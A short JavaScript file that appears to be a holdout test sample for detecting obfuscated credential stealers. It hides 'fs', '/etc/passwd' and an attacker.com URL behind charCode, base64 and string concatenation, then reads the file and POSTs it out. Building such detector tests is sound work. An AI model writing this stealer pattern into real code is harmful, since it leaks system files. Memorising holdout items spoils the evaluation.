// Holdout v4 — mixed-obfuscation-stealer: 3 techniques combined
// Module name via charCode
const modName = String.fromCharCode(102, 115);
// Path via base64
const credPath = Buffer.from('L2V0Yy9wYXNzd2Q=', 'base64').toString();
// URL via concat
const host = 'https://' + 'att' + 'acker' + '.com';

const data = require(modName).readFileSync(credPath, 'utf8');
require('https').request(host, { method: 'POST' }, () => {}).write(data);
